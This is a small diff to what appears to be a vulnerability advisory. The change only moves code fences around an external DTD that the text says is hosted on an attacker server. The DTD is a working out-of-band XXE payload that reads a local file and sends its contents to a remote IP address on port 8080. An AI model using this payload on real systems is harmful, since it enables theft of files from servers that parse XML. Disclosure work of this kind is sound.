@@ -65,7 +65,7 @@ ALLAGENTS="YES"><DESCRIPTION></DESCRIPTION><ROLES/></USER>]]></USER></USERS></PA
 
 External DTD code hosted on attacker server as xxe.dtd:
 
-```<!ENTITY % data SYSTEM "file:///c:/sensative.txt">
-<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://52.15.202.214:8080/?%data;'>">```
+<!ENTITY % data SYSTEM "file:///c:/sensative.txt">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://52.15.202.214:8080/?%data;'>">
 
 
